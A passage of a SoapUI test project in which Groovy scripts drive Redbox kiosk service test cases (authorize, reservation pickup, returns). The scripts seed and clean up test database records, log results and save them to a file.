getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
testRunner.testCase.setPropertyValue("AccountNumber",getCP.getPropertyValue("CpAccountNumber"));
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="69dab47e-3479-412b-afa0-b294742af8c5"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", ''); //HardCoded to empty for ModResvPickup Scenario.
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", 'false'); //HardCoded to false for ModResvPickup Scenario.
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", context.expand( '${DataSource#MDVFlag}' ));
tc.setPropertyValue("MDVDiscNumber",context.expand( '${DataSource#MDVDiscNumber}' ));


//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="d7e65004-1953-419d-8f1a-edeba3ca5d9c"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="PickupValidation" id="3e9ab344-53e3-4d68-9b28-70629d9934e8"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = "false" //HardCoded
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["PickupValidation"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' )
def AccountNumber = context.expand( '${#TestCase#AccountNumber}' )

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("CustomerProfileNumber", CustomerProfileNumber);
tc.setPropertyValue("AccountNumber", AccountNumber);
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [PickupValidation] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
}</script></con:config></con:testStep><con:testStep type="groovy" name="ModResvPickup" id="c3471779-7909-45f2-a283-a9fd1cf2421e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ModResvPickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ModifiedCart", "false");
tc.setPropertyValue("ItemSourceType", authtc.getPropertyValue("ItemSourceType"));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="5078cc64-61b1-4d52-99b6-cee1c7aea296"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ModResvPickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="f5f06c0f-8219-4ddc-afc6-6fa2c3f3af67"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="02bdb636-a13f-4fac-b45d-24b14fc03ffe"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983003</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058110</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return 